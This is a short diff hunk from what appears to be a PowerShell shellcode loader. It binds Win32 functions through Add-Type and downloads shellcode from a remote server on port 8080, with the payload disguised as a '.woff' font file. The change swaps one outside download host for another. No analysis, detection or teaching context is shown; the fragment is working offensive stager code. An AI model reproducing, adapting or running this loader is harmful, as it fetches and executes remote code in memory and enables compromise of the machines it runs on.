@@ -23,7 +23,7 @@ public static extern UInt32 WaitForSingleObject(
 "@
 Add-Type $Win32
 
-$shellcode = (New-Object System.Net.WebCLient).DownloadData("http://login.magic-box.dev:8080/balls.woff")
+$shellcode = (New-Object System.Net.WebCLient).DownloadData("http://security.psuccso.org:8080/balls.woff")
 if ($shellcode -eq $null) {Exit};
 $size = $shellcode.Length
 
